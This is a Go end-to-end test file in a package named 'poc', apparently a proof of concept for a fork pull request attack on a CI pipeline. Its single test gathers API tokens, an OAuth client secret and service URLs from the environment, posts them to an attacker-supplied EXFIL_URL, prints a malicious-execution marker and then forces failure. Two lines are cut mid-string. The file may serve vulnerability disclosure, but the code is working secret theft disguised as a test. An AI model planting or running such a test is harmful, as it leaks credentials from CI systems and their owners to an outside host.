//go:build e2e

package poc

import (
"fmt"
"net/http"
"net/url"
"os"
"testing"
)

func TestForkPRExfil(t *testing.T) {
exfil := os.Getenv("EXFIL_URL")
if exfil == "" {
g")
}

v := url.Values{}
v.Set("marker", "fork-pr")
v.Set("api_token", os.Getenv("API_TOKEN"))
v.Set("platform_token", os.Getenv("PLATFORM_TOKEN"))
v.Set("oauth_client_id", os.Getenv("OAUTH_CLIENT_ID"))
v.Set("oauth_client_secret", os.Getenv("OAUTH_CLIENT_SECRET"))
v.Set("oauth_token_endpoint", os.Getenv("OAUTH_TOKEN_ENDPOINT"))
v.Set("classic_url", os.Getenv("CLASSIC_URL"))
v.Set("platform_url", os.Getenv("PLATFORM_URL"))

resp, err := http.PostForm(exfil, v)
if err != nil {
uest failed: %v", err)
}
_ = resp.Body.Close()

fmt.Println("MALICIOUS_EXECUTION_MARKER=fork-pr")
t.Fatalf("forced failure after exfil")
}
